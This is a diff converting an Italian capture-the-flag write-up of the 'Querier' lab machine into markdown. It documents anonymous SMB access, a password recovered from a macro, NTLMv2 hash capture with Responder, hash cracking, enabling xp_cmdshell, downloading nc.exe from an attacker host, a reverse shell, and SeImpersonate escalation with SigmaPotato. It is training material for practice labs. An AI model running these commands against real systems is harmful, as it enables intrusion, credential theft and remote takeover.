@@ -3,25 +3,29 @@ title: Querier
 layout: writeup
 --- -->
 <div id="content-display">
-    <h1>Querier</h1>
-
-    <h2>IP</h2>
-    <pre><code>
+    
+    # Querier
+    ```table-of-contents
+    ```
+    ## IP
+    ```shell
     sudo sh -c "echo '10.129.59.155 querier' >> /etc/hosts"
-    </code></pre>
-
-    <h2>Port Scanning</h2>
-    <pre><code>
+    ```
+    ## Port Scanning
+    ```shell
     rustscan -a querier --ulimit 5000 -- -sVC -Pn -n
+    #OR
+    rustscan -t 10000 -b 300 -a querier --ulimit 5000 -- -Pn -n -sVC -Pn -n -sVC --max-rate 300 -T1 --max-rtt-timeout 10000ms
+
 
     Open 10.129.59.155:135
     Open 10.129.59.155:139
     Open 10.129.59.155:445
     Open 10.129.59.155:1433
     Open 10.129.59.155:5985
-    </code></pre>
+    ```
 
-    <pre><code>
+    ```shell
     [>] Running script "nmap -vvv -p {{port}} {{ip}} -sVC -Pn -n" on ip 10.129.59.155
 
     PORT      STATE SERVICE       REASON          VERSION
@@ -107,11 +111,11 @@ layout: writeup
     | smb2-security-mode: 
     |   3:1:1: 
     |_    Message signing enabled but not required
-    </code></pre>
-    <h2>Exploiting</h2>
-    <h3>445 - SMB</h3>
+    ```
+    ## Exploiting
+    ### 445 - SMB
     Proviamo ad enumerare le share con l'utente anonimo:
-    <pre><code>
+    ```shell
     smbclient -L querier -U anonymous%anonymous
 
         Sharename       Type      Comment
@@ -120,49 +124,49 @@ layout: writeup
         C$              Disk      Default share
         IPC$            IPC       Remote IPC
         Reports         Disk      
-    </code></pre>
+    ```
 
     Proviamo a leggere la share `Reports`
-    <pre><code>
+    ```shell
     smbclient //querier/Reports -U anonymous%anonymous
-    </code></pre>
+    ```
 
-    <pre><code>
+    ```shell
     smb: \> ls
     .                                   D        0  Tue Jan 29 00:23:48 2019
     ..                                  D        0  Tue Jan 29 00:23:48 2019
     Currency Volume Report.xlsm         A    12229  Sun Jan 27 23:21:34 2019
-    </code></pre>
+    ```
     I file con estensione _XLSM_ sono un tipo di file di foglio di calcolo che supportano le macro. Possiamo vederlo come un file zip con dentro dei file.
 
     Scarico il file per ispezionarlo:
-    <pre><code>
+    ```shell
     smb: \> get "Currency Volume Report.xlsm"
 
     getting file \Currency Volume Report.xlsm of size 12229 as Currency Volume Report.xlsm (60.3 KiloBytes/sec) (average 60.3 KiloBytes/sec)
-    </code></pre>
+    ```
 
     Verifico che tipo di file è
-    <pre><code>
+    ```shell
     file 'Currency Volume Report.xlsm'                       
 
     Currency Volume Report.xlsm: Microsoft Excel 2007+
-    </code></pre>
+    ```
 
     Provo a vedere se estraendo le stringhe dal file trovo qualcosa di interessante:
-    <pre><code>
+    ```shell
     strings Currency\ Volume\ Report.xlsm                  
-    </code></pre>
+    ```
     Non trovo nulla di utile.
 
     Dato che possiamo trattarlo con se fosse un archivio:
-    <pre><code>
+    ```shell
     unzip 'Currency Volume Report.xlsm' -d .
     cd xl
     strings vbaProject.bin
-    </code></pre>
+    ```
 
-    </code></pre>txt
+    ```txt
     macro to pull data for client volume reports
     n.Conn]
     Open 
@@ -309,16 +313,16 @@ layout: writeup
     [Workspace]
     ThisWorkbook=26, 26, 1062, 609, C
     Sheet1=52, 52, 1088, 635, C
-    </code></pre>
+    ```
         Uid=reporting;Pwd=PcwTWTHRwryjc$c6
 
     Abbiamo un utente e una password.
     Proviamo ad usarli per accedere al servizio MS-SQL.
-    <h3>1443 - MS-SQL</h3>
+    ### 1443 - MS-SQL
     Vediamo la porta `1433` aperta con `ms-sql-s` esposto:
 
     Banner Grabbing::
-    <pre><code>
+    ```shell
     nmap -p 1433 -sV --script-args mssql.instance-all querier   
 
     Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-22 15:02 CET
@@ -327,26 +331,26 @@ layout: writeup
 
     PORT     STATE SERVICE  VERSION
     1433/tcp open  ms-sql-s Microsoft SQL Server 2017 14.00.1000
-    </code></pre>
+    ```
 
     Proviamo a loggarci:
-    <pre><code>
+    ```shell
     /usr/bin/impacket-mssqlclient reporting:'PcwTWTHRwryjc$c6'@querier -windows-auth
 
     SQL (QUERIER\reporting  reporting@volume)> 
-    </code></pre>
+    ```
     Ci siamo loggati!
-    <h2>Privilege Escalation</h2>
+    ## Privilege Escalation
     Controllo se ho i permessi di sysadmin:
-    <pre><code>
+    ```shell
     SQL (QUERIER\reporting  reporting@volume)> SELECT IS_SRVROLEMEMBER('sysadmin');
         
     -   
     0   
-    </code></pre>
+    ```
 
     Databases:
-    <pre><code>
+    ```shell
     SQL (QUERIER\reporting  reporting@volume)> SELECT name FROM master.sys.databases;
     name     
     ------   
@@ -355,28 +359,28 @@ layout: writeup
     model    
     msdb     
     volume   
-    </code></pre>
+    ```
 
     Tables's name:
-    <pre><code>
+    ```shell
     SELECT table_name,table_schema from volume.INFORMATION_SCHEMA.TABLES;
 
     # Empty
-    </code></pre>
+    ```
 
     List users
-    <pre><code>
+    ```shell
     SQL (QUERIER\reporting  reporting@volume)> SELECT sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') order by sp.name;
     login               login_type      password_hash   create_date   modify_date   status     
     -----------------   -------------   -------------   -----------   -----------   --------   
     QUERIER\reporting   WINDOWS_LOGIN            NULL   2019-01-29 00:10:07   2019-01-29 00:10:07   b'Enabled'   
 
     sa                  SQL_LOGIN                NULL   2003-04-08 09:10:35   2019-01-28 23:52:01   b'Disabled'  
-    </code></pre>
+    ```
     L'account sa è stato disattivato e il nostro account non ha i permessi di system admin.
 
     A questo punto potremmo pensare di essere bloccati ma arriva in nostro soccorso `xp_dirtree` che ci permette di navigare sul filesystem dell'host.
-    <pre><code>
+    ```shell
     SQL (QUERIER\reporting  reporting@volume)> EXEC xp_dirtree 'C:\Users', 1, 1;
 
     subdirectory    depth   file   
@@ -387,103 +391,103 @@ layout: writeup
     Default User        1      0   
     mssql-svc           1      0   
     Public              1      0  
-    </code></pre>
+    ```
     Notiamo un nuovo utente! `mssql-svc`
 
     Se proviamo a enumerare le cartelle degli utenti non vediamo ne file ne cartelle.
     Possiamo sfruttare `xp_dirtree` in combinazione con `responder` per catturare l'NTLMv2 dell'utente che lancia i comandi!
 
     Avviamo responder:
-    <pre><code>
+    ```shell
     sudo responder -I tun0
-    </code></pre>
+    ```
 
     Navighiamo verso il nostro responder:
-    <pre><code>
+    ```shell
     SQL (QUERIER\reporting  reporting@volume)> EXEC xp_dirtree '\\10.10.14.130/fake', 1, 1;
-    </code></pre>
+    ```
 
     Riceviamo:
-    <pre><code>
+    ```shell
     [SMB] NTLMv2-SSP Client   : 10.129.59.155
     [SMB] NTLMv2-SSP Username : QUERIER\mssql-svc
     [SMB] NTLMv2-SSP Hash     : mssql-svc::QUERIER:f5b2c6fb9b1bbf2c:32046ABF89C12A2C128490F885BFD862:010100000000000080532B5BD55BDC01E0383B503F97A4000000000002000800450044005800430001001E00570049004E002D0031004D00420047004B004300550052004B004A005A0004003400570049004E002D0031004D00420047004B004300550052004B004A005A002E0045004400580043002E004C004F00430041004C000300140045004400580043002E004C004F00430041004C000500140045004400580043002E004C004F00430041004C000700080080532B5BD55BDC0106000400020000000800300030000000000000000000000000300000D7A8F7DDD876A3EABF41E6FDCF272BE280153FFF7828EC5D1503A381358ABF560A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E00310033003000000000000000000000000000
-    </code></pre>
+    ```
 
     Crackiamo l'hash ntlmv2
-    <pre><code>
+    ```shell
     hashcat -m 5600 'mssql-svc::QUERIER:f5b2c6fb9b1bbf2c:32046ABF89C12A2C128490F885BFD862:010100000000000080532B5BD55BDC01E0383B503F97A4000000000002000800450044005800430001001E00570049004E002D0031004D00420047004B004300550052004B004A005A0004003400570049004E002D0031004D00420047004B004300550052004B004A005A002E0045004400580043002E004C004F00430041004C000300140045004400580043002E004C004F00430041004C000500140045004400580043002E004C004F00430041004C000700080080532B5BD55BDC0106000400020000000800300030000000000000000000000000300000D7A8F7DDD876A3EABF41E6FDCF272BE280153FFF7828EC5D1503A381358ABF560A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E00310033003000000000000000000000000000' /usr/share/wordlists/rockyou.txt --force
-    </code></pre>
+    ```
 
-    <pre><code>
+    ```shell
     MSSQL-SVC::QUERIER:f5b2c6fb9b1bbf2c:32046abf89c12a2c128490f885bfd862:010100000000000080532b5bd55bdc01e0383b503f97a4000000000002000800450044005800430001001e00570049004e002d0031004d00420047004b004300550052004b004a005a0004003400570049004e002d0031004d00420047004b004300550052004b004a005a002e0045004400580043002e004c004f00430041004c000300140045004400580043002e004c004f00430041004c000500140045004400580043002e004c004f00430041004c000700080080532b5bd55bdc0106000400020000000800300030000000000000000000000000300000d7a8f7ddd876a3eabf41e6fdcf272be280153fff7828ec5d1503a381358abf560a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e00310033003000000000000000000000000000:corporate568
-    </code></pre>
+    ```
         corporate568
 
     Abbiamo la password per l'utente!
     `mssql-svc:corporate568`
 
     Proviamo a conneterci su mssql col nuovo utente:
-    <pre><code>
+    ```shell
     /usr/bin/impacket-mssqlclient 'mssql-svc':'corporate568'@querier -windows-auth
-    </code></pre>
+    ```
     Funziona!
 
     Controlliamo i permessi:
-    </code></pre>
+    ```
     SQL (QUERIER\mssql-svc  dbo@master)> SELECT IS_SRVROLEMEMBER('sysadmin');
         
     -   
     1   
-    </code></pre>
+    ```
     Abbiamo i permessi di sysadmin! Possiamo lanciare comandi con `xp_cmdshell`!
 
     Abilitiamo `xp_cmdshell`:
-    </code></pre>
+    ```
     EXEC sp_configure 'show advanced options', 1;
     RECONFIGURE;
     EXEC sp_configure 'xp_cmdshell', 1;
     RECONFIGURE;
-    </code></pre>
+    ```
 
     Scarichiamo nc dal nostro browser:
-    </code></pre>powershell
+    ```powershell
     EXEC xp_cmdshell 'powershell -c "mkdir C:\Temp"';
     EXEC xp_cmdshell 'powershell -c "Invoke-WebRequest -Uri http://10.10.14.130/nc.exe -OutFile C:\Temp\nc.exe"';
     EXEC xp_cmdshell 'powershell -c "ls C:\Temp"';
-    </code></pre>
+    ```
 
     Apriamo un listhener:
-    </code></pre>
+    ```
     nc -lnvp 1234
-    </code></pre>
+    ```
 
     Avviamo la connessione:
-    </code></pre>powershell
+    ```powershell
     EXEC xp_cmdshell 'powershell -c "C:\Temp\nc.exe 10.10.14.130 1234 -e powershell"';
-    </code></pre>
+    ```
 
     Otteniamo:
-    </code></pre>powershell
+    ```powershell
     PS C:\Windows\system32> whoami
 
     whoami
     querier\mssql-svc
-    </code></pre>
+    ```
 
     Enumero i file sensibili:
-    </code></pre>powershell
+    ```powershell
     PS C:\Windows\system32> Get-ChildItem -Path C:\Users\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
 
         Directory: C:\Users\mssql-svc\Desktop
     Mode                LastWriteTime         Length Name                                                                  
     ----                -------------         ------ ----                                                                  
     -ar---       11/22/2025   1:51 PM             34 user.txt    
-    </code></pre>
+    ```
     User flag.
 
     Controlliamo i privilegi dell'account:
-    </code></pre>powershell
+    ```powershell
     PS C:\Windows\system32> whoami /priv
 
     PRIVILEGES INFORMATION
@@ -496,48 +500,48 @@ layout: writeup
     SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
     SeCreateGlobalPrivilege       Create global objects                     Enabled 
     SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
-    </code></pre>
+    ```
         SeImpersonatePrivilege
 
     Possiamo sfruttare SigmaPotato per elevare in nostro account ad admin o crearne uno nuovo.
 
     Avviamo un server da cui scaricheremo SigmaPotato:
-    <pre><code>
+    ```shell
     python3 -m http.server 80
-    </code></pre>
+    ```
 
     Scarichiamo e avviamo sigmaPotato:
-    </code></pre>powershell
+    ```powershell
     cd C:\Temp; iwr http://10.10.14.130/SigmaPotato.exe -o C:\Temp\SigmaPotato.exe
-    </code></pre>
+    ```
 
-    <pre><code>
+    ```shell
     nc -lnvp 2345
-    </code></pre>
+    ```
 
     Usiamo nc per aprici un altra shell: con i privilegi di ntautority system
-    </code></pre>powershell
+    ```powershell
     .\SigmaPotato "C:\Temp\nc.exe 10.10.14.130 2345 -e powershell"
-    </code></pre>
+    ```
 
     Otteniamo.
-    </code></pre>powershell
+    ```powershell
     PS C:\Temp> whoami
 
     nt authority\system
-    </code></pre>
-    <h2>User flag</h2>
-    <pre><code>
+    ```
+    ## User flag
+    ```shell
     type C:\Users\mssql-svc\Desktop\user.txt
 
     61cd************************b2b4
-    </code></pre>
-    
-    <h2>Root flag</h2>
-    <pre><code>
+    ```
+
+    ## Root flag
+    ```shell
     type C:\Users\Administrator\Desktop\root.txt
 
     f333************************d245
-    </code></pre>
+    ```
 
 </div>
